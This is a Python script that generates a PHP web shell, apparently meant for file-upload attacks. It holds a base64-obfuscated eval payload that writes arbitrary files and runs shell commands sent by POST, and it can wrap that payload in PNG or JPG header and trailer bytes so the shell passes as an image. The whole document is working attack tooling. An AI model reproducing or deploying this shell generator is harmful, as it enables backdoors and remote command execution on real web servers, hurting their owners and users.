#!/usr/bin/env python3
from binascii import hexlify,unhexlify
from argparse import ArgumentParser
from os import path

parser = ArgumentParser()
parser.add_argument('-t', type=str, help='Type of file')
parser.add_argument('-l', type=str, help='List types of files/payloads')
parser.add_argument("-o", type=str, help="Output filename to save as")
parser.add_argument('-p', type=str, default="php", help="Payload type")
args = parser.parse_args()

splash= "         __         ____                 \n"
splash+="   _____/ /_  ___  / / /___ ____  ____   \n"
splash+="  / ___/ __ \/ _ \/ / / __ `/ _ \/ __ \  \n"
splash+=" (__  ) / / /  __/ / / /_/ /  __/ / / /  \n"
splash+="/____/_/ /_/\___/_/_/\__, /\___/_/ /_/   \n"
splash+="                    /____/               \n"

payloads = {
  "php": b'<?php eval(base64_decode("ZnVuY3Rpb24gaGV4VG9TdHIoJGhleCl7CiAgICAkc3RyaW5nPScnOwogICAgZm9yICgkaT0wOyAkaSA8IHN0cmxlbigkaGV4KS0xOyAkaSs9Mil7CiAgICAgICAgJHN0cmluZyAuPSBjaHIoaGV4ZGVjKCRoZXhbJGldLiRoZXhbJGkrMV0pKTsKICAgIH0KICAgIHJldHVybiAkc3RyaW5nOwp9CmlmKGlzc2V0KCRfUE9TVFsndXBsJ10pKSB7CiAgJG15ZmlsZSA9IGZvcGVuKCRfUE9TVFsndXBsJ10sICJ3Iikgb3IgZGllKCJVbmFibGUgdG8gb3BlbiBmaWxlISIpOwogIGZ3cml0ZSgkbXlmaWxlLCBoZXhUb1N0cigkX1BPU1RbJ2NvbnRlbnQnXSkpOwogIGVjaG8gInVwbG9hZCBzdWNjZXNzZnVsIjsKfSBlbHNlaWYoaXNzZXQoJF9QT1NUWydjb250ZW50J10pKSB7CiAgZWNobyBzaGVsbF9leGVjKCRfUE9TVFsnY29udGVudCddKTsKfQ==")); ?>',
}

filetypes = {
'png': {'b': b'89504e470d0a1a0a0000000d49484452', 'e': b'00000049454e44ae426082'},
'jpg': {'b': b'FFD8FFE000004A46494600', 'e': b'ffd9'}
}

def save(fpath, content): 
  open(fpath, 'wb').write(content)
  print(f"[*] File saved to {fpath}")

def wrapper(filetype, payload):
  content = unhexlify(filetypes[filetype]['b']) + payload + unhexlify(filetypes[filetype]['e'])
  return content


#--------------------------------------------------------------------------------------------------
#Input validation
print(splash)

if args.l:
  print(payloads.items())
  print(filetypes.items())
  exit()
elif args.o:
  filename = args.o
else:
  print("[!] No filename argument")
  exit()
if args.p:
  if not args.p in payloads.keys():
    print("[!] Payload not in list")
    print(payloads.items())
    exit()
if args.t:
  if not args.t in filetypes.keys():
    print("[!] Filetype not in list")
    print(filetypes.items())
    exit()
  content = wrapper(args.t, payloads[args.p])
else:
  content = payloads[args.p]

save(filename, content)
    



